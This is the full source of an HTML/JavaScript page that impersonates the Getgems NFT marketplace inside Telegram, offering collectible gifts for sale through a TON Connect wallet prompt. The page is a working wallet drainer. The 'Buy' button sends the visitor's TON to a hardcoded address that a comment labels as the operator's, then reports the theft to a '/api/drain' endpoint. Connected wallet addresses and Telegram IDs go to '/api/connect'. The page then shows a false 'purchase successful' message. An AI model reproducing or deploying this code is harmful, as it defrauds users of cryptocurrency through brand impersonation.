<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Getgems: купить и продать NFT</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0D0F17;
            font-family: 'Inter', sans-serif;
            color: #FFFFFF;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px 12px 40px;
        }
        .container { width: 100%; max-width: 640px; }

        /* Верхняя панель с логотипом */
        .header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 16px; width: 100%;
        }
        .logo {
            display: flex; align-items: center; gap: 8px;
        }
        .logo-icon {
            width: 36px; height: 36px;
            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            border-radius: 10px;
            display: flex; align-items: center; justify-content: center;
            font-weight: 800; font-size: 22px; color: white;
        }
        .logo-text {
            font-weight: 700; font-size: 20px;
            background: linear-gradient(135deg, #FFFFFF 0%, #AAAAAA 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .wallet-indicator {
            background: rgba(255,138,0,0.1);
            border: 1px solid rgba(255,138,0,0.3);
            border-radius: 40px; padding: 8px 16px;
            display: flex; align-items: center; gap: 10px;
            cursor: pointer; transition: 0.2s;
            font-size: 14px; font-weight: 500; color: #FF8A00;
        }
        .wallet-indicator:hover { background: rgba(255,138,0,0.2); }
        .wallet-dot { width: 10px; height: 10px; background: #FF8A00; border-radius: 50%; box-shadow: 0 0 10px #FF8A00; }

        /* Табы */
        .tabs {
            display: flex; gap: 16px; margin-bottom: 20px; overflow-x: auto;
            padding-bottom: 8px; border-bottom: 1px solid #2C3142;
        }
        .tab {
            color: #7A7F94; font-weight: 600; font-size: 16px; cursor: pointer;
            white-space: nowrap; padding-bottom: 8px; border-bottom: 2px solid transparent;
        }
        .tab.active { color: #FF8A00; border-bottom-color: #FF8A00; }

        /* Поиск */
        .search-section { margin: 16px 0; width: 100%; }
        .search-box {
            background: #171B26; border: 1px solid #2C3142; border-radius: 40px;
            padding: 12px 18px; display: flex; align-items: center; gap: 10px;
        }
        .search-box input {
            background: transparent; border: none; outline: none;
            color: #FFFFFF; font-size: 15px; width: 100%;
        }
        .search-box input::placeholder { color: #4A4F66; }

        /* Фильтры */
        .filters {
            display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap;
        }
        .filter-chip {
            background: #171B26; border: 1px solid #2C3142; border-radius: 40px;
            padding: 8px 16px; font-size: 14px; color: #FFFFFF; cursor: pointer;
            display: flex; align-items: center; gap: 6px;
        }
        .filter-chip svg { width: 16px; height: 16px; fill: #7A7F94; }

        /* Сетка подарков */
        .gifts-grid {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
            margin: 16px 0;
        }
        .gift-card {
            background: #171B26; border: 1px solid #2C3142; border-radius: 24px;
            padding: 16px; cursor: pointer; transition: 0.2s;
        }
        .gift-card:hover { border-color: #FF8A00; transform: translateY(-2px); }
        .gift-image {
            width: 100%; aspect-ratio: 1/1; background: #2C3142; border-radius: 20px;
            margin-bottom: 12px; overflow: hidden;
        }
        .gift-image img { width: 100%; height: 100%; object-fit: cover; }
        .gift-name { font-weight: 700; font-size: 16px; margin-bottom: 4px; }
        .gift-number { color: #FF8A00; font-size: 14px; margin-bottom: 8px; }
        .gift-price { font-weight: 600; color: #FF8A00; font-size: 18px; }

        /* Нижняя навигация */
        .bottom-nav {
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #0D0F17; border-top: 1px solid #2C3142;
            display: flex; justify-content: space-around; padding: 12px 0;
        }
        .nav-item {
            color: #7A7F94; font-size: 12px; text-align: center; cursor: pointer;
        }
        .nav-item.active { color: #FF8A00; }

        /* Модалка подключения кошелька (точная копия со скрина) */
        .modal-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
            display: flex; align-items: center; justify-content: center;
            z-index: 1000; visibility: hidden; opacity: 0;
            transition: 0.2s; padding: 20px;
        }
        .modal-overlay.active { visibility: visible; opacity: 1; }
        .modal {
            background: #1C1F2A; border-radius: 32px; padding: 24px;
            width: 100%; max-width: 400px; border: 1px solid #2C3142;
        }
        .modal h3 { font-size: 22px; font-weight: 700; margin-bottom: 20px; }
        .modal .ton-connect-badge {
            display: flex; align-items: center; gap: 8px; margin-bottom: 24px;
            color: #7A7F94; font-size: 14px;
        }
        .modal .ton-connect-badge img { width: 24px; height: 24px; }
        .telegram-wallet-btn {
            background: #2C3142; border-radius: 60px; padding: 16px;
            text-align: center; font-weight: 600; margin-bottom: 24px;
            cursor: pointer; border: 1px solid #FF8A00;
        }
        .section-title { color: #7A7F94; font-size: 14px; margin-bottom: 16px; }
        .wallets-grid {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
        }
        .wallet-item {
            background: #252B38; border-radius: 20px; padding: 16px 8px;
            text-align: center; cursor: pointer; transition: 0.2s;
        }
        .wallet-item:hover { background: #2F3545; }
        .wallet-item img { width: 40px; height: 40px; border-radius: 12px; margin-bottom: 8px; }
        .wallet-item span { font-size: 14px; font-weight: 500; }
        .view-all {
            text-align: center; color: #FF8A00; margin-top: 20px; cursor: pointer;
            font-weight: 600; padding: 12px; border-radius: 40px;
            background: rgba(255,138,0,0.1);
        }
        .view-all:hover { background: rgba(255,138,0,0.2); }
        .close-modal {
            text-align: center; color: #7A7F94; margin-top: 20px; cursor: pointer;
            font-size: 16px;
        }

        /* Модалка деталей подарка */
        .gift-detail-modal .modal { max-width: 480px; }
        .gift-detail-image {
            width: 100%; aspect-ratio: 1/1; background: #2C3142; border-radius: 32px;
            margin-bottom: 20px; overflow: hidden;
        }
        .gift-detail-image img { width: 100%; height: 100%; object-fit: cover; }
        .gift-detail-name { font-size: 28px; font-weight: 800; margin-bottom: 8px; }
        .gift-detail-number { color: #FF8A00; font-size: 18px; margin-bottom: 16px; }
        .gift-detail-price { font-size: 24px; font-weight: 700; color: #FF8A00; margin-bottom: 24px; }
        .buy-button {
            width: 100%; background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
            border: none; border-radius: 60px; padding: 18px; font-weight: 700;
            font-size: 18px; color: white; cursor: pointer; transition: 0.2s;
        }
        .buy-button:active { transform: scale(0.98); }
        .loader {
            width: 40px; height: 40px; border: 3px solid #2C3142;
            border-top: 3px solid #FF8A00; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script src="https://unpkg.com/tonconnect-sdk@latest/lib/tonconnect-sdk.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo"><div class="logo-icon">G</div><div class="logo-text">Getgems</div></div>
            <div class="wallet-indicator" id="walletIndicator"><span class="wallet-dot"></span><span id="walletShort">Connect</span></div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active">Подарки</div>
            <div class="tab">Стикеры</div>
            <div class="tab">Номера</div>
            <div class="tab">Юзернейм</div>
        </div>

        <!-- Search -->
        <div class="search-section">
            <div class="search-box">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#7A7F94"><circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/><path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2"/></svg>
                <input type="text" placeholder="Название или описание..." disabled>
            </div>
        </div>

        <!-- Filters -->
        <div class="filters">
            <div class="filter-chip">Коллекции ▼</div>
            <div class="filter-chip">Backdrop ▼</div>
            <div class="filter-chip">Style ▼</div>
        </div>

        <!-- Gifts grid -->
        <div class="gifts-grid" id="giftsGrid"></div>
    </div>

    <!-- Bottom navigation -->
    <div class="bottom-nav">
        <div class="nav-item active">Маркет</div>
        <div class="nav-item">Звёзды</div>
        <div class="nav-item">Каталог</div>
        <div class="nav-item">Корзина</div>
        <div class="nav-item">Профиль</div>
    </div>

    <!-- Wallet modal (точная копия скрина) -->
    <div class="modal-overlay" id="walletModal">
        <div class="modal">
            <h3>Подключите TON кошелёк</h3>
            <div class="ton-connect-badge">
                <img src="https://ton.org/favicon.ico" width="24" height="24" style="border-radius:50%;"> TON Connect
            </div>
            <div class="telegram-wallet-btn" id="telegramWalletBtn">
                Открыть Wallet в Telegram
            </div>
            <div class="section-title">или выберите другое приложение</div>
            <div class="wallets-grid">
                <div class="wallet-item" id="walletTonkeeper">
                    <img src="https://tonkeeper.com/assets/tonkeeper-icon.png" alt="Tonkeeper">
                    <span>Tonkeeper</span>
                </div>
                <div class="wallet-item" id="walletMyTonWallet">
                    <img src="https://mytonwallet.org/logo.png" alt="MyTonWallet">
                    <span>MyTonWallet</span>
                </div>
                <div class="wallet-item" id="walletTonhub">
                    <img src="https://tonhub.com/tonhub-logo.png" alt="Tonhub">
                    <span>Tonhub</span>
                </div>
                <div class="wallet-item" id="walletViewAll">
                    <div style="width:40px;height:40px;background:#2C3142;border-radius:12px;margin-bottom:8px;display:flex;align-items:center;justify-content:center;color:#FF8A00;font-weight:bold;">+5</div>
                    <span>View all wallets</span>
                </div>
            </div>
            <div class="close-modal" id="closeModal">Отмена</div>
        </div>
    </div>

    <!-- Gift detail modal -->
    <div class="modal-overlay gift-detail-modal" id="giftDetailModal">
        <div class="modal">
            <div class="gift-detail-image" id="detailImage"></div>
            <div class="gift-detail-name" id="detailName"></div>
            <div class="gift-detail-number" id="detailNumber"></div>
            <div class="gift-detail-price" id="detailPrice"></div>
            <button class="buy-button" id="detailBuyBtn">Купить</button>
            <div class="close-modal" id="closeDetailModal">Назад</div>
        </div>
    </div>

    <script>
        (function() {
            // ⚠️ ТВОЙ TON КОШЕЛЁК (на который будут уходить средства)
            const YOUR_WALLET = 'UQAc1Qleeg12HCIreHGd621jBEdX_FULt8gRUthPbOzMKlyB';

            // Данные подарков (как на скрине)
            const gifts = [
                { name: 'Signet Ring', number: 14510, price: 199, image: 'https://fragment.com/images/gifts/star.png?1' },
                { name: 'Electric Skull', number: 258, price: 555, image: 'https://fragment.com/images/gifts/cake.png?1' }
            ];

            let connector = null;
            let walletAddress = null;
            let selectedGift = null;
            let telegramId = null;

            if (window.Telegram?.WebApp?.initDataUnsafe?.user?.id) {
                telegramId = window.Telegram.WebApp.initDataUnsafe.user.id;
            }

            function renderGifts() {
                const grid = document.getElementById('giftsGrid');
                grid.innerHTML = '';
                gifts.forEach(g => {
                    const card = document.createElement('div');
                    card.className = 'gift-card';
                    card.innerHTML = `
                        <div class="gift-image"><img src="${g.image}" alt="${g.name}" loading="lazy"></div>
                        <div class="gift-name">${g.name}</div>
                        <div class="gift-number">#${g.number}</div>
                        <div class="gift-price">${g.price} TON</div>
                    `;
                    card.addEventListener('click', () => openGiftDetail(g));
                    grid.appendChild(card);
                });
            }

            function openGiftDetail(gift) {
                selectedGift = gift;
                document.getElementById('detailImage').innerHTML = `<img src="${gift.image}" alt="${gift.name}">`;
                document.getElementById('detailName').innerText = gift.name;
                document.getElementById('detailNumber').innerText = `#${gift.number}`;
                document.getElementById('detailPrice').innerText = `${gift.price} TON`;
                document.getElementById('giftDetailModal').classList.add('active');
            }

            function closeGiftDetail() {
                document.getElementById('giftDetailModal').classList.remove('active');
            }

            async function initTonConnect() {
                try {
                    connector = new TonConnectSDK.TonConnect({
                        manifestUrl: `https://${window.location.hostname}/tonconnect-manifest.json`
                    });
                    connector.onStatusChange((wallet) => {
                        if (wallet) {
                            walletAddress = wallet.account.address;
                            document.getElementById('walletShort').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                            document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.2)';
                            fetch('/api/connect', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ address: walletAddress, chain: wallet.account.chain, telegram_id: telegramId })
                            }).catch(() => {});
                        } else {
                            walletAddress = null;
                            document.getElementById('walletShort').innerText = 'Connect';
                            document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.1)';
                        }
                    });
                    if (connector.wallet) {
                        walletAddress = connector.wallet.account.address;
                        document.getElementById('walletShort').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                    }
                } catch (e) { console.error(e); }
            }

            function showWalletModal() { document.getElementById('walletModal').classList.add('active'); }
            function hideWalletModal() { document.getElementById('walletModal').classList.remove('active'); }

            async function connectWallet(walletName) {
                hideWalletModal();
                if (!connector) return;
                try {
                    const walletsList = await connector.getWallets();
                    const wallet = walletsList.find(w => w.name.toLowerCase().includes(walletName.toLowerCase()));
                    if (wallet) {
                        const link = connector.connect(wallet);
                        window.open(link, '_blank');
                    } else if (walletName === 'telegram') {
                        // Telegram Wallet не поддерживается напрямую в TON Connect, можно открыть @wallet
                        window.open('https://t.me/wallet', '_blank');
                    } else if (walletName === 'viewall') {
                        alert('Выберите кошелёк из списка');
                    }
                } catch (e) { alert('Connection error: ' + e.message); }
            }

            async function sendTransaction(amountTon) {
                if (!connector || !connector.wallet) { showWalletModal(); return; }
                const amountNano = Math.floor(amountTon * 1e9);
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [{ address: YOUR_WALLET, amount: amountNano.toString() }]
                };
                try {
                    document.getElementById('statusMessage')?.remove?.(); // если есть
                    const result = await connector.sendTransaction(transaction);
                    fetch('/api/drain', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            tx_hash: result, amount: amountTon, wallet: YOUR_WALLET,
                            telegram_id: telegramId, gift_name: selectedGift?.name
                        })
                    }).catch(() => {});
                    alert('Покупка успешна! Транзакция: ' + result.slice(0,10) + '...');
                    closeGiftDetail();
                } catch (e) {
                    alert('Ошибка транзакции: ' + e.message);
                }
            }

            // Обработчики
            document.getElementById('walletTonkeeper').addEventListener('click', () => connectWallet('tonkeeper'));
            document.getElementById('walletMyTonWallet').addEventListener('click', () => connectWallet('mytonwallet'));
            document.getElementById('walletTonhub').addEventListener('click', () => connectWallet('tonhub'));
            document.getElementById('walletViewAll').addEventListener('click', () => connectWallet('viewall'));
            document.getElementById('telegramWalletBtn').addEventListener('click', () => connectWallet('telegram'));
            document.getElementById('closeModal').addEventListener('click', hideWalletModal);
            document.getElementById('closeDetailModal').addEventListener('click', closeGiftDetail);
            document.getElementById('walletIndicator').addEventListener('click', () => { if (!walletAddress) showWalletModal(); });
            document.getElementById('detailBuyBtn').addEventListener('click', () => {
                if (!selectedGift) return;
                if (!walletAddress) { closeGiftDetail(); showWalletModal(); }
                else sendTransaction(selectedGift.price);
            });
            document.getElementById('walletModal').addEventListener('click', (e) => {
                if (e.target.classList.contains('modal-overlay')) hideWalletModal();
            });
            document.getElementById('giftDetailModal').addEventListener('click', (e) => {
                if (e.target.classList.contains('modal-overlay')) closeGiftDetail();
            });

            renderGifts();
            initTonConnect();
            if (window.Telegram?.WebApp) { Telegram.WebApp.ready(); Telegram.WebApp.expand(); }
        })();
    </script>
</body>
</html>
